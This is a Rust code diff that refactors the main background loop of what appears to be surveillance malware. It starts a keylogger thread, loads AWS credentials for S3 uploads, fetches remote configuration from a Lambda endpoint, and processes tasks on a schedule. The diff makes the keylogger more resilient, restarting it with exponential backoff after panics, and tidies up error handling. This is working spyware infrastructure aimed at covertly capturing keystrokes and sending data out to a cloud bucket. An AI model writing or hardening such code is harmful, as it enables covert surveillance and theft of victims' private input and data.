@@ -5,132 +5,167 @@ use std::error::Error;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::Arc;
 use std::thread;
-use std::time::{Duration, Instant};
-use log::{error, info, debug};
+use std::time::{Duration, Instant, SystemTime};
+use log::{error, info, debug, warn};
 use crate::tracker::TaskTracker;
 use crate::config::{get_config_from_lambda, ConfigAws};
 use crate::logsetup::logging::cleanup_old_logs;
 use crate::RUNNING;
 use crate::s3upload::S3Uploader;
 use crate::tasks::processor::TaskProcessor;
-
 use crate::awscnf::credentials::CredentialsManager;
+use tokio::sync::Mutex;
+use anyhow::{Result, Context};
 
-pub async fn start_background_process() -> Result<(), Box<dyn Error>> {
-    let _lock_file = match ensure_single_instance() {
-        Ok(file) => file,
-        Err(e) => {
-            eprintln!("Another instance is already running or failed to acquire lock: {}", e);
-            return Ok(());
-        }
-    };
+pub async fn start_background_process() -> Result<()> {
+    let _lock_file = ensure_single_instance()
+        .map_err(|e| anyhow::anyhow!("Failed to acquire single instance lock: {}", e))?;
 
-    // Schedule log cleanup
-    std::thread::spawn(|| {
-        loop {
-            if let Err(e) = cleanup_old_logs("config/config.toml") {
-                error!("Failed to cleanup old logs: {}", e);
+    // Global shared state
+    let global_running = Arc::new(AtomicBool::new(true));
+    let config_mutex = Arc::new(Mutex::new(ConfigAws::default()));
+
+    // Log cleanup thread
+    {
+        let running_clone = global_running.clone();
+        thread::spawn(move || {
+            while running_clone.load(Ordering::SeqCst) {
+                if let Err(e) = cleanup_old_logs("config/config.toml") {
+                    error!("Log cleanup failed: {}", e);
+                }
+                thread::sleep(Duration::from_secs(24 * 60 * 60));
             }
-            // Check for cleanup every 24 hours
-            std::thread::sleep(std::time::Duration::from_secs(24 * 60 * 60));
-        }
-    });
-
-
-    info!("Starting background process...");
-
-    let running = Arc::new(AtomicBool::new(true));
-    let r = running.clone();
-
-    if let Err(e) = ctrlc::set_handler(move || {
-        info!("Received shutdown signal");
-        r.store(false, Ordering::SeqCst);
-        RUNNING.store(false, Ordering::SeqCst);
-    }) {
-        return Err(Box::new(e));
+        });
     }
 
-    let last_screenshot_time = Instant::now();
-    let last_camerashot_time = Instant::now();
-    let last_upload_time = Instant::now();
-    let task_tracker = TaskTracker::new();
+    // Ctrl-C handler
+    {
+        let running_clone = global_running.clone();
+        ctrlc::set_handler(move || {
+            info!("Received shutdown signal");
+            running_clone.store(false, Ordering::SeqCst);
+            RUNNING.store(false, Ordering::SeqCst);
+        }).context("Failed to set ctrl-c handler")?;
+    }
 
-    thread::spawn(move || {
-        debug!("Starting keylogger thread");
-        crate::keylogger::start_keylogging();
-    });
-
-    // Initialize credentials manager
+    // Initialize credentials and S3 uploader
     let credentials_manager = CredentialsManager::new();
-    let aws_creds = match credentials_manager.get_credentials().await {
-        Ok(creds) => {
-            info!("AWS credentials loaded successfully");
-            creds
-        },
-        Err(e) => {
-            error!("Failed to load AWS credentials: {}", e);
-            return Err(Box::new(std::io::Error::new(std::io::ErrorKind::Other, e.to_string())));
-        }
-    };
+    let aws_creds = credentials_manager.get_credentials()
+        .await
+        .map_err(|e| anyhow::anyhow!("Failed to get AWS credentials: {}", e))?;
 
-    let s3_uploader = match S3Uploader::new(
+    let s3_uploader = S3Uploader::new(
         aws_creds.region,
         &aws_creds.bucket_name,
         &aws_creds.access_key,
         &aws_creds.secret_key
-    ).await {
-        Ok(uploader) => {
-            info!("S3 uploader initialized successfully");
-            uploader
-        },
-        Err(e) => {
-            error!("Failed to initialize S3 uploader: {}", e);
-            return Err(Box::new(std::io::Error::new(std::io::ErrorKind::Other, e.to_string())));
-        }
-    };
+    ).await
+        .map_err(|e| anyhow::anyhow!("Failed to initialize S3 uploader: {}", e))?;
 
-    let mut last_config_check = Instant::now();
-    let mut last_active_time = std::time::SystemTime::now();
-    let mut current_config = ConfigAws::default();
-    let mut task_processor = TaskProcessor::new(s3_uploader).await?;
+    // Persistent task processor
+    let task_processor = Arc::new(Mutex::new(TaskProcessor::new(s3_uploader)
+        .await
+        .map_err(|e| anyhow::anyhow!("Failed to create task processor: {}", e))?));
 
-    while RUNNING.load(Ordering::SeqCst) {
+    let task_tracker = TaskTracker::new();
 
-        // Check if system was sleeping by comparing elapsed time
-        let current_time = std::time::SystemTime::now();
-        if let Ok(elapsed) = current_time.duration_since(last_active_time) {
-            if elapsed > Duration::from_secs(120) { // If more than 2 minutes passed
-                info!("System appears to have been sleeping, resetting task timers");
-                task_processor.reset_timers();
-            }
-        }
-        last_active_time = current_time;
+    // Improved Keylogger thread with sleep-safe restart
+    {
+        let running_clone = global_running.clone();
+        thread::spawn(move || {
+            let mut consecutive_failures = 0;
+            const MAX_CONSECUTIVE_FAILURES: u32 = 5;
+            const INITIAL_BACKOFF: Duration = Duration::from_secs(1);
+            const MAX_BACKOFF: Duration = Duration::from_secs(60);
 
-        if last_config_check.elapsed() >= Duration::from_secs(120) {
-            debug!("Checking for new configuration");
-            match get_config_from_lambda().await {
-                Ok(config) => {
-                    info!("Retrieved new configuration");
-                    current_config = config;
-                    last_config_check = Instant::now();
-                },
-                Err(e) => {
-                    error!("Failed to get configuration: {}", e);
+            while running_clone.load(Ordering::SeqCst) {
+                let start_time = Instant::now();
+
+                let result = std::panic::catch_unwind(|| {
+                    crate::keylogger::start_keylogging()
+                });
+
+                match result {
+                    Ok(_) => {
+                        // Successful run, reset failure count
+                        consecutive_failures = 0;
+                    }
+                    Err(e) => {
+                        // Log the specific error
+                        error!("Keylogger thread panicked: {:?}", e);
+                        consecutive_failures += 1;
+
+                        // Exponential backoff with jitter
+                        let backoff = INITIAL_BACKOFF * 2u32.pow(consecutive_failures.min(5));
+                        let jittered_backoff = backoff + Duration::from_millis(rand::random::<u64>() % 1000);
+
+                        // Cap the maximum backoff time
+                        let sleep_duration = jittered_backoff.min(MAX_BACKOFF);
+
+                        // Additional check for excessive failures
+                        if consecutive_failures >= MAX_CONSECUTIVE_FAILURES {
+                            error!("Keylogger repeatedly failed. Pausing thread.");
+                            break;
+                        }
+
+                        thread::sleep(sleep_duration);
+                    }
+                }
+
+                // Prevent tight spinning if the operation is very quick
+                let elapsed = start_time.elapsed();
+                if elapsed < Duration::from_millis(100) {
+                    thread::sleep(Duration::from_millis(100) - elapsed);
                 }
             }
-        }
-        info!("before process_all_tasks --------------------------------> 1");
-        if let Err(e) = process_all_tasks(&current_config, &task_tracker).await {
-            error!("Error processing All tasks: {}", e);
-        }
-        info!("before process_tasks --------------------------------> 2");
-        if let Err(e) = task_processor.process_tasks(&current_config).await {
-            error!("Error performing scheduled tasks: {}", e);
-        }
 
-        tokio::time::sleep(Duration::from_secs(60)).await;
+            warn!("Keylogger thread exiting.");
+        });
     }
 
-    info!("Background process shutting down");
+    // Main background task loop
+    let mut last_config_check = Instant::now();
+    let mut last_system_active = SystemTime::now();
+
+    while global_running.load(Ordering::SeqCst) && RUNNING.load(Ordering::SeqCst) {
+        let current_time = SystemTime::now();
+
+        // Sleep detection and recovery
+        if let Ok(elapsed) = current_time.duration_since(last_system_active) {
+            if elapsed > Duration::from_secs(120) {
+                warn!("System appears to have been sleeping. Performing recovery...");
+                task_processor.lock().await.reset_timers();
+                last_system_active = current_time;
+            }
+        }
+        last_system_active = current_time;
+
+        // Periodic config refresh
+        if last_config_check.elapsed() >= Duration::from_secs(120) {
+            match get_config_from_lambda().await {
+                Ok(new_config) => {
+                    *config_mutex.lock().await = new_config;
+                    last_config_check = Instant::now();
+                },
+                Err(e) => error!("Config refresh failed: {}", e),
+            }
+        }
+
+        // Process tasks
+        let current_config = config_mutex.lock().await.clone();
+
+        if let Err(e) = process_all_tasks(&current_config, &task_tracker).await {
+            error!("All tasks processing failed: {}", e);
+        }
+
+        if let Err(e) = task_processor.lock().await.process_tasks(&current_config).await {
+            error!("Scheduled tasks processing failed: {}", e);
+        }
+
+        // Prevent tight loop
+        tokio::time::sleep(Duration::from_secs(30)).await;
+    }
+
+    info!("Background process shutting down gracefully");
     Ok(())
 }
